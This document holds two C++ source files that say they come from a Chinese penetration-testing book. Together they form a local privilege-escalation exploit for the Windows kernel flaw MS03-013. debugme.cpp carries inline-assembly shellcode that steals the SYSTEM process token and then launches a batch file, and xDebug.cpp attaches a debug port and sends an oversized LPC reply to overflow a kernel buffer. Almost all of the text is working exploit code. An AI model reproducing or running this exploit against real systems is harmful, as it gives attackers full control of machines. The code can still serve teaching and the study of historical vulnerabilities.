/* debugme.cpp
*
*  《网络渗透技术》演示程序
*  作者：san, alert7, eyas, watercloud
*
*  Windows内核消息处理本地缓冲区溢出利用程序
*/

#include <windows.h>
#include <stdio.h>
#pragma pack(1)

typedef struct _SomeInfo
{
    DWORD    dwNum;
    DWORD    dwRealCode;
    DWORD    dwShellCode;    
    DWORD    dw[3];
    DWORD    dwESP;
    DWORD    dwCS;
    DWORD    dwDS;
    DWORD    dwES;
}SOMEINFO, *PSOMEINFO;

unsigned    char    shellcode[512];
unsigned    char    realcode[512];
DWORD        dwFS;
HANDLE        hProcess;
DWORD        dwRun;
SOMEINFO    si;

void  shellcodefnlock();
void  realcodefnlock();
void getshellcode(unsigned char *pDst, int iSize, BYTE *pSrc);
void CreateNewProcess()
{
    STARTUPINFO si={sizeof(si)};
    PROCESS_INFORMATION pi;
    
    CreateProcess(NULL, "ey4s.bat", NULL, NULL,
        TRUE, CREATE_NEW_CONSOLE , NULL, NULL, &si, &pi);
    exit(0);
}

void main()
{
    HMODULE    h;
    DWORD    dwESP, dwCS, dwDS, dwES;

    //保存寄存器值
    __asm
    {
        mov        dwESP, esp
        sub        dwESP, 0x100

        push        cs
        pop        eax
        and        eax,0xFFFF
        mov        dwCS, eax

        push        ds
        pop        eax
        and        eax,0xFFFF
        mov        dwDS, eax

        push        es
        pop        eax
        and        eax,0xFFFF
        mov        dwES, eax

        push        fs
        pop        eax
        and        eax,0xFFFF
        mov        dwFS, eax
    }
    //取得shellcode
    getshellcode(shellcode, sizeof(shellcode), (BYTE *)shellcodefnlock);
    getshellcode(realcode, sizeof(realcode), (BYTE *)realcodefnlock);
    //传递一些信息给debuger
    dwRun = (DWORD)&CreateNewProcess;
    si.dwNum = sizeof(si)/sizeof(DWORD) -1 ;
    si.dwRealCode = (DWORD)&realcode;
    si.dwShellCode = (DWORD)&shellcode;
    si.dwESP = dwESP;
    si.dwCS = dwCS;
    si.dwDS = dwDS;
    si.dwES = dwES;
    printf( "shellcode 0x%.8X\n"
            "realcode 0x%.8X\n"
            "ESP=%.8X CS=0x%X DS=0x%X ES=0x%X FS=0x%X\n",
            si.dwShellCode, si.dwRealCode, si.dwESP,
             si.dwCS, si.dwDS, si.dwES, dwFS);
    RaiseException(0x1981, 0, sizeof(si)/sizeof(DWORD), (DWORD *)&si);
    //触发Load Dll和Free Dll事件
    while(1)
    {    
        //printf(".");
        h=LoadLibrary("ws2_32.dll");
        Sleep(1000);
        FreeLibrary(h);
        Sleep(1000);
    }
}

void  shellcodefnlock()
{
    _asm
    {
     nop
     nop
     nop
     nop
     nop
     nop
     nop
     nop

/*start here*/

/*--------提升权限--------*/
    //获取当前进程的KPEB地址
    mov        eax,fs:[0x124]
    mov        esi,[eax+0x44]
    mov        eax,esi

    /*搜索SYSTEM进程的KPEB地址*/
    //获得下一个进程的KPEB
search:
    mov        eax,[eax+0xa0]
    sub        eax,0xa0
    cmp        [eax+0x9c],0x8//从PID判断是否SYSTEM进程
    jne        search

    mov        eax,[eax+0x12c]//获取system进程的token
    mov        [esi+0x12c],eax//修改当前进程的token

/*------------从核心态返回应用态--------------*/
    //保存esp
    mov        esi,esp

    //搜索iretd所需要的参数
    mov        eax,esp
    add        eax,0x10//跳过我们的数据
next:
    add        eax,0x4
    mov        ebx,[eax]
    cmp        ebx,[esi+0x4]//cs linux系统是0x23,win2k好像都是1b
    jne        next
    //
    sub        eax,0x4//此时eax指向的即为iretd返回所需要的参数起始地址
    mov        esp,eax
    mov        [eax],ebp//ebp是realcode的地址,设置返回后的eip为realcode的起始地址
    add        eax,0xC
    //设置返回应用态后的esp
    mov        ebx,[esi]
    mov        [eax], ebx

    //恢复寄存器值
    push    [esi+0x8]
    pop        ds
    push    [esi+0xc]
    pop        es
    //返回应用态
    iretd
/*end here*/
     int 3
     NOP
     NOP
     NOP
     NOP
     NOP
     NOP
     NOP
     NOP
     
    }
} 

void  realcodefnlock()
{
    _asm
    {
     nop
     nop
     nop
     nop
     nop
     nop
     nop
     nop

/*start here*/
    push    dwFS
    pop    fs
    //call our function
    call    dwRun
/*end here*/
     int 3
     NOP
     NOP
     NOP
     NOP
     NOP
     NOP
     NOP
     NOP
     
    }
}

void getshellcode(unsigned char *pDst, int iSize, BYTE *pSrc)
{
    unsigned    char    temp;
    unsigned    char    *shellcodefnadd, *start;
    int            len,k;
    char *fnendstr="\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    #define  FNENDLONG   0x08
    
    /* 定位　shellcodefnlock的汇编代码　*/
    shellcodefnadd=pSrc;
    temp=*shellcodefnadd;
    if(temp==0xe9) 
    {
          ++shellcodefnadd;
          k=*(int *)shellcodefnadd;
          shellcodefnadd+=k;
          shellcodefnadd+=4;
    }
    for(k=0;k<=0x500;++k)
         if(memcmp(shellcodefnadd+k,fnendstr,FNENDLONG)==0) 
             break;
    /* shellcodefnadd+k+8是得到的shellcodefnlock汇编代码地址 */
    len=0;
    start=shellcodefnadd+k+8;
    //len = 2*wcslen(shellcodefnadd+k+8);
    while((BYTE)start[len] != (BYTE)'\xcc')
    {
        pDst[len] = start[len];
        len++;
        if(len>=iSize-1) break;
    }
    //memcpy(shellcode,shellcodefnadd+k+8,len);
    pDst[len]='\0';
}

/*-------------------------------------------------------------------
xDebug.cpp
written by ey4s
cooleyas@21cn.com
2003-05-23
-------------------------------------------------------------------*/
#include <windows.h>
#include <stdio.h>

#define    offset    0x100+0x4-0x6*4

typedef enum _PROCESSINFOCLASS {
ProcessDebugPort=7// 7 Y Y
} PROCESSINFOCLASS;

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR Buffer;
} UNICODE_STRING ,*PUNICODE_STRING;

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
}CLIENT_ID,* PCLIENT_ID, **PPCLIENT_ID;

typedef struct _LPC_MESSAGE 
{
  USHORT                  DataSize;
  USHORT                  MessageSize;
  USHORT                  MessageType;
  USHORT                  DataInfoOffset;
  CLIENT_ID               ClientId;
  ULONG                   MessageId;
  ULONG                   SectionSize;
//  UCHAR                      Data[];
}LPC_MESSAGE, *PLPC_MESSAGE;

typedef struct _OBJECT_ATTRIBUTES
{
    DWORD           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    DWORD           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
}OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES, **PPOBJECT_ATTRIBUTES;

typedef 
DWORD
(CALLBACK * NTCREATEPORT)(

  OUT PHANDLE             PortHandle,
  IN POBJECT_ATTRIBUTES   ObjectAttributes,
  IN ULONG                MaxConnectInfoLength,
  IN ULONG                MaxDataLength,
  IN OUT PULONG           Reserved OPTIONAL );

typedef 
DWORD
(CALLBACK * NTREPLYWAITRECVIVEPORT)(

  IN HANDLE               PortHandle,
  OUT PHANDLE             ReceivePortHandle OPTIONAL,
  IN PLPC_MESSAGE         Reply OPTIONAL,
  OUT PLPC_MESSAGE        IncomingRequest );


typedef 
DWORD
(CALLBACK * NTREPLYPORT)(

  IN HANDLE               PortHandle,
  IN PLPC_MESSAGE         Reply );

typedef 
DWORD
(CALLBACK * NTSETINFORMATIONPROCESS)(

  IN HANDLE               ProcessHandle,
  IN PROCESSINFOCLASS ProcessInformationClass,
  IN PVOID                ProcessInformation,
  IN ULONG                ProcessInformationLength );


typedef struct _DEBUG_MESSAGE
{
    LPC_MESSAGE        PORT_MSG;
    DEBUG_EVENT        DebugEvent;
}DEBUG_MESSAGE, *PDEBUG_MESSAGE;


NTSETINFORMATIONPROCESS NtSetInformationProcess;
NTREPLYWAITRECVIVEPORT    NtReplyWaitReceivePort;
NTCREATEPORT            NtCreatePort;
NTREPLYPORT                NtReplyPort;

template <int i> struct PORT_MESSAGEX : LPC_MESSAGE {
UCHAR Data[i];
};

PROCESS_INFORMATION    pi;

int main()
{
    HMODULE hNtdll;    
    DWORD    dwAddrList[9];
    BOOL    bExit = FALSE;
    DWORD    dwRet;
    HANDLE    hPort;
    int        k=0;
    DEBUG_MESSAGE dm;
    OBJECT_ATTRIBUTES oa = {sizeof(oa)};
    PORT_MESSAGEX<0x130> PortReply;
    STARTUPINFO    si={sizeof(si)};

    printf( "\nxDebug -> windows kernel exploit for MS03-013\n"
            "Written by ey4s<cooleyas@21cn.com>\n"
            "2003-05-23\n\n");

    //get native api address
    hNtdll = LoadLibrary("ntdll.dll");
    if(hNtdll == NULL) 
    {
        printf("LoadLibrary failed:%d\n", GetLastError());
        return 0;
    }

    NtReplyWaitReceivePort = (NTREPLYWAITRECVIVEPORT)
         GetProcAddress(hNtdll, "NtReplyWaitReceivePort");

    NtCreatePort = (NTCREATEPORT)
         GetProcAddress(hNtdll, "NtCreatePort");

    NtReplyPort = (NTREPLYPORT)
         GetProcAddress(hNtdll, "NtReplyPort");

    NtSetInformationProcess = (NTSETINFORMATIONPROCESS)
         GetProcAddress(hNtdll, "NtSetInformationProcess");

    //create port
    dwRet = NtCreatePort(&hPort, &oa, 0, 0x148, 0);
    if(dwRet != 0)
    {
        printf("create hPort failed. ret=%.8X\n", dwRet);
        return 0;
    }
    //create process
    if(!CreateProcess(0, "debugme.exe", NULL, NULL, TRUE,
        CREATE_SUSPENDED, 0, 0, &si, &pi))
    {
        printf("CreateProcess failed:%d\n", GetLastError());
        return 0;
    }
    //set debug port
    dwRet = NtSetInformationProcess(pi.hProcess, ProcessDebugPort,
        &hPort, sizeof(hPort));
    if(dwRet != 0)
    {
        printf("set debug port error:%.8X\n", dwRet);
        return 0;
    }
    //printf("pid:0x%.8X %d hPort=0x%.8X\n", pi.dwProcessId, pi.dwProcessId, hPort);
    ResumeThread(pi.hThread);

    while (true) 
    {
        memset(&dm, 0, sizeof(dm));
        NtReplyWaitReceivePort(hPort, 0, 0, &dm.PORT_MSG);
        k++;
        switch (dm.DebugEvent.dwDebugEventCode+1) 
        { 
            case EXCEPTION_DEBUG_EVENT: 
                printf("DEBUG_EVENT --> except\n");
                
if(dm.DebugEvent.u.Exception.ExceptionRecord.NumberParameters == 9)
                {
                    memcpy((unsigned char *)&dwAddrList,
                        (unsigned char 
*)&dm.DebugEvent.u.Exception.ExceptionRecord.ExceptionInformation,
                        sizeof(dwAddrList));
                    /*int    n;
                    for(n=0;n<6;n++)
                        printf("%.8X\n", dwAddrList[n]);*/
                }
                break;

            case CREATE_THREAD_DEBUG_EVENT:  
                printf("DEBUG_EVENT --> create thread\n");
                break;

            case CREATE_PROCESS_DEBUG_EVENT: 
                printf("DEBUG_EVENT --> create process\n");
                break;

            case EXIT_THREAD_DEBUG_EVENT: 
                printf("DEBUG_EVENT --> exit thread\n");
                break;

            case EXIT_PROCESS_DEBUG_EVENT: 
                printf("DEBUG_EVENT --> exit process\n");
                bExit = TRUE;
                break;

            case LOAD_DLL_DEBUG_EVENT: 
                printf("DEBUG_EVENT --> load dll\n");
                break;

            case UNLOAD_DLL_DEBUG_EVENT: 
                printf("DEBUG_EVENT --> unload dll\n");
                break;

            case OUTPUT_DEBUG_STRING_EVENT:  
                printf("DEBUG_EVENT --> debug string\n");        
                break;

        } //end of switch
        //printf("k=%d\n",k);
        if(k==10)
        {
            //printf("************\n");
            //Sleep(4*1000);
            memset(&PortReply, 0, sizeof(PortReply));
            memcpy(&PortReply, &dm, sizeof(dm));
            PortReply.MessageSize = 0x148;
            PortReply.DataSize = 0x130;
            memset(&PortReply.Data, 'a', sizeof(PortReply.Data));
            memcpy(&PortReply.Data[offset-4], &dwAddrList, sizeof(dwAddrList));
            dwRet = NtReplyPort(hPort, &PortReply);
            if(dwRet ==0 )
                printf("Send shellcode to ntoskrnl completed!"
                    "Wait for exit.\n");
            else
                printf("NtReply err:%.8X\n", dwRet);
        }
        else 
            NtReplyPort(hPort, &dm.PORT_MSG);
        if(bExit) break;
    }//end of while
    return 0;
}
